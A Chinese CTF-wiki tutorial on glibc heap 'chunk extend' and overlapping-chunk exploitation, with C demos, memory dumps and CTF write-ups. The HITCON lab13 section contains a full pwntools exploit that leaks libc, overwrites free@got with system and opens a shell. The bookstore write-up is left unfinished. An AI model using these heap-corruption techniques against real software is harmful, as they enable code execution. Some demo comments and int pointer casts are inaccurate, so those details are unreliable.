# Chunk Extend and Overlapping

## 介紹
chunk extend是堆漏洞的一種常見利用手法，通過extend可以實現chunk overlapping的效果。這種利用方法需要以下的時機和條件：

* 程序中存在基於堆的漏洞
* 漏洞可以控制 chunk header 中的數據

## 原理
chunk extend技術能夠產生的原因在於ptmalloc在對堆chunk進行操作時使用的各種宏。

在ptmalloc中，獲取 chunk 塊大小的操作如下
```
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)->mchunk_size)
```
一種是直接獲取 chunk 的大小，不忽略掩碼部分，另外一種是忽略掩碼部分。

在 ptmalloc 中，獲取下一 chunk 塊地址的操作如下
```
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
```
即使用當前塊指針加上當前塊大小。

在 ptmalloc 中，獲取前一個 chunk 信息的操作如下
```
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
```
即通過malloc_chunk->prev_size獲取前一塊大小，然後使用本 chunk 地址減去所得大小。

在 ptmalloc，判斷當前 chunk 是否是use狀態的操作如下：
```
#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
```
即查看下一 chunk 的 prev_inuse 域，而下一塊地址又如我們前面所述是根據當前 chunk 的 size 計算得出的。

更多的操作詳見 `堆相關數據結構` 一節。

通過上面幾個宏可以看出，ptmalloc通過chunk header的數據判斷chunk的使用情況和對chunk的前後塊進行定位。簡而言之，chunk extend就是通過控制size和pre_size域來實現跨越塊操作從而導致overlapping的。

與chunk extend類似的還有一種稱爲chunk shrink的操作。這裏只介紹chunk extend的利用。

## 基本示例1：對inuse的fastbin進行extend
簡單來說，該利用的效果是通過更改第一個塊的大小來控制第二個塊的內容。
**注意，我們的示例都是在64位的程序。如果想在32位下進行測試，可以把8字節偏移改爲4字節**。
```
int main(void)
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);//分配第一個0x10的chunk
    malloc(0x10);//分配第二個0x10的chunk
    
    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一個塊的size域
    
    free(ptr);
    ptr1=malloc(0x30);// 實現 extend，控制了第二個塊的內容
    return 0;
}
```
當兩個malloc語句執行之後，堆的內存分佈如下
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 <=== top chunk
```
之後，我們把 chunk1 的 size 域更改爲 0x41，0x41 是因爲 chunk 的 size 域包含了用戶控制的大小和 header 的大小。如上所示正好大小爲0x40。在題目中這一步可以由堆溢出得到。
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== 篡改大小
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 
```
執行 free 之後，我們可以看到 chunk2 與 chunk1 合成一個 0x40 大小的 chunk，一起釋放了。
```
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```
之後我們通過 malloc(0x30) 得到 chunk1+chunk2 的塊，此時就可以直接控制chunk2中的內容，我們也把這種狀態稱爲 overlapping chunk。
```
call   0x400450 <malloc@plt>
mov    QWORD PTR [rbp-0x8], rax

rax = 0x602010
```

## 基本示例2：對inuse的smallbin進行extend
通過之前深入理解堆的實現部分的內容，我們得知處於 fastbin 範圍的 chunk 釋放後會被置入 fastbin 鏈表中，而不處於這個範圍的 chunk 被釋放後會被置於unsorted bin鏈表中。
以下這個示例中，我們使用 0x80 這個大小來分配堆（作爲對比，fastbin 默認的最大的 chunk 可使用範圍是0x70）
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);//分配第一個 0x80 的chunk1
    malloc(0x10); //分配第二個 0x10 的chunk2
    malloc(0x10); //防止與top chunk合併
    
    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}
```
在這個例子中，因爲分配的 size 不處於 fastbin 的範圍，因此在釋放時如果與 top chunk 相連會導致和top chunk合併。所以我們需要額外分配一個chunk，把釋放的塊與top chunk隔開。
```
0x602000:	0x0000000000000000	0x00000000000000b1 <===chunk1 篡改size域
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000021 <=== 防止合併的chunk
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
釋放後，chunk1 把 chunk2 的內容吞併掉並一起置入unsorted bin
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== 被放入unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x00000000000000b0	0x0000000000000020 <=== 注意此處標記爲空
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
```
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
```
再次進行分配的時候就會取回 chunk1 和 chunk2 的空間，此時我們就可以控制 chunk2 中的內容
```
     0x4005b0 <main+74>        call   0x400450 <malloc@plt>
 →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax
 
     rax : 0x0000000000602010
```

## 基本示例3：對free的smallbin進行extend
示例3是在示例2的基礎上進行的，這次我們先釋放 chunk1，然後再修改處於 unsorted bin 中的 chunk1 的size域。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);//分配第一個0x80的chunk1
    malloc(0x10);//分配第二個0x10的chunk2
    
    free(ptr);//首先進行釋放，使得chunk1進入unsorted bin
    
    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
}
```
兩次 malloc 之後的結果如下
```
0x602000:	0x0000000000000000	0x0000000000000091 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
我們首先釋放chunk1使它進入unsorted bin中
```
     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:	0x0000000000000000	0x0000000000000091 <=== 進入unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51 <=== top chunk
```
然後篡改chunk1的size域
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== size域被篡改
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
此時再進行 malloc 分配就可以得到 chunk1+chunk2 的堆塊，從而控制了chunk2 的內容。

## Chunk Extend/Shrink 可以做什麼  

一般來說，這種技術並不能直接控制程序的執行流程，但是可以控制chunk中的內容。如果 chunk 存在字符串指針、函數指針等，就可以利用這些指針來進行信息泄漏和控制執行流程。

此外通過extend可以實現chunk overlapping，通過overlapping可以控制chunk的fd/bk指針從而可以實現 fastbin attack 等利用。

## 基本示例4：通過extend後向overlapping
這裏展示通過extend進行後向overlapping，這也是在CTF中最常出現的情況，通過overlapping可以實現其它的一些利用。
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);//分配第1個 0x80 的chunk1
    malloc(0x10); //分配第2個 0x10 的chunk2
    malloc(0x10); //分配第3個 0x10 的chunk3
    malloc(0x10); //分配第4個 0x10 的chunk4    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
```
在malloc(0x50)對extend區域重新佔位後，其中0x10的fastbin塊依然可以正常的分配和釋放，此時已經構成overlapping，通過對overlapping的進行操作可以實現fastbin attack。

## 基本示例5：通過extend前向overlapping
這裏展示通過修改pre_inuse域和pre_size域實現合併前面的塊
```
int main(void)
{
	void *ptr1,*ptr2,*ptr3,*ptr4;
	ptr1=malloc(128);//smallbin1
	ptr2=malloc(0x10);//fastbin1
	ptr3=malloc(0x10);//fastbin2
	ptr4=malloc(128);//smallbin2
	malloc(0x10);//防止與top合併
	free(ptr1);
	*(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
	*(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
	free(ptr4);//unlink進行前向extend
	malloc(0x150);//佔位塊
	
}
```
前向extend利用了smallbin的unlink機制，通過修改pre_size域可以跨越多個chunk進行合併實現overlapping。

## HITCON Training lab13
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13)

### 基本信息

```shell
➜  hitcontraning_lab13 git:(master) file heapcreator
heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped
➜  hitcontraning_lab13 git:(master) checksec heapcreator
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序爲 64 位動態鏈接程序，主要開啓了 Canary 保護與 NX 保護。

### 基本功能

程序大概是一個自定義的堆分配器，每個堆主要有兩個成員：大小與內容指針。主要功能如下

1. 創建堆，根據用戶輸入的長度，申請對應內存空間，並利用 read 讀取指定長度內容。這裏長度沒有進行檢測，當長度爲負數時，會出現任意長度堆溢出的漏洞。當然，前提是可以進行 malloc。此外，這裏讀取之後並沒有設置 NULL。
2. 編輯堆，根據指定的索引以及之前存儲的堆的大小讀取指定內容，但是這裏讀入的長度會比之前大 1，所以會**存在 off by one 的漏洞**。
3. 展示堆，輸出指定索引堆的大小以及內容。
4. 刪除堆，刪除指定堆，並且將對應指針設置爲了 NULL。

### 利用

基本利用思路如下

1. 利用off by one 漏洞覆蓋下一個chunk 的 size 字段，從而構造僞造的 chunk 大小。
2. 申請僞造的 chunk 大小，從而產生 chunk overlap，進而修改關鍵指針。

更加具體的還是直接看腳本吧。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./heapcreator')
heap = ELF('./heapcreator')
libc = ELF('./libc.so.6')


def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


free_got = 0x602018
create(0x18, "dada")  # 0
create(0x10, "ddaa")  # 1
# overwrite heap 1's struct's size to 0x41
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
# trigger heap 1's struct to fastbin 0x40
# heap 1's content to fastbin 0x20
delete(1)
# new heap 1's struct will point to old heap 1's content, size 0x20
# new heap 1's content will point to old heap 1's struct, size 0x30
# that is to say we can overwrite new heap 1's struct
# here we overwrite its heap content pointer to free@got
create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
# leak freeaddr
show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
#gdb.attach(r)
# overwrite free@got with system addr
edit(1, p64(system_addr))
# trigger system("/bin/sh")
delete(0)
r.interactive()
```

## 2015 hacklu bookstore
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore)

### 基本信息

```shell
➜  2015_hacklu_bookstore git:(master) file books    
books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
➜  2015_hacklu_bookstore git:(master) checksec books    
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出該程序是動態鏈接的 64 位程序，主要開啓了 Canary 與 NX 保護。

### 基本功能

該程序的主要功能是訂書，具體如下

- 最多可以訂購兩本書。
- 根據編號來選擇訂購第幾本書，可以爲每本書添加對應的名字。然而在添加名字處出現了任意長度堆溢出的漏洞。
- 根據編號來刪除 order，但是這裏只是單純地 free 掉，並沒有置爲 NULL，因此會出現 use after free 的漏洞。
- 提交訂單，將兩本書的名字合在一起。這裏由於上面堆溢出的問題，這裏也會出現堆溢出的漏洞。
- 此外，在程序退出之前存在一個**格式化字符串漏洞**。

這裏雖然程序的漏洞能力很強，但是所有進行 malloc 的大小都是完全固定的，我們只能藉助這些分配的 chunk 來進行操作。

### 利用思路

程序中主要的漏洞在於堆溢出和格式化字符串漏洞，但是如果想要利用格式化字符串漏洞，必然需要溢出對應的dest 數組。具體思路如下

1. 利用堆溢出進行 chunk extend，使得在 submit 中 `malloc(0x140uLL)` 時，恰好返回第二個訂單處的位置。在 submit 之前，佈置好堆內存佈局，使得把字符串拼接後恰好可以覆蓋 dest 爲指定的格式化字符串。
2. 通過構造 dest 爲指定的格式化字符串：一方面泄漏 __libc_start_main_ret 的地址，**一方面控制程序重新返回執行**。這時，便可以知道 libc 基地址，system 等地址。需要注意的是由於一旦 submit 之後，程序就會直接直接退出，所以我們比較好的思路就是修改 fini_array 中的變量，以便於達到程序執行完畢後，**重新返回我們期待的位置**。這裏我們會使用一個trick，程序每次讀取選擇的時候會讀取 128 大小，在棧上。而程序最後在輸出 dest 的時候，之前所讀取的那部分選擇必然是在棧上的，所以我們如果我們在棧上預先佈置好一些控制流指針，那就可以來控制程序的執行流程。
3. 再次利用格式化字符串漏洞，覆蓋 free@got 爲 system 地址，從而達到任意命令執行的目的。

這裏，各個參數的偏移是

- Fini_array0 : 5+8=13
- __libc_start_main_ret : 5+0x1a=31。

```
00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0
01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000
02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx
04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 ('%sffffff')
05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (' 2: Orde')
07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* '5\n' */
08:0040│      0x7ffe6a7f3f08 ◂— 0x0
... ↓
0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000
0c:0060│      0x7ffe6a7f3f28 ◂— 0x0
... ↓
0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* 'ttime' */
10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 ('vdso_get')
11:0088│      0x7ffe6a7f3f50 ◂— 0x1
12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1
13:0098│      0x7ffe6a7f3f60 ◂— 0x0
... ↓
15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15
16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp
17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1
18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00
19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15
1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax
```

**！！！待補充！！！**

## 題目

- [2016 Nuit du Hack CTF Quals : night deamonic heap](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2016_NuitduHack_nightdeamonicheap)

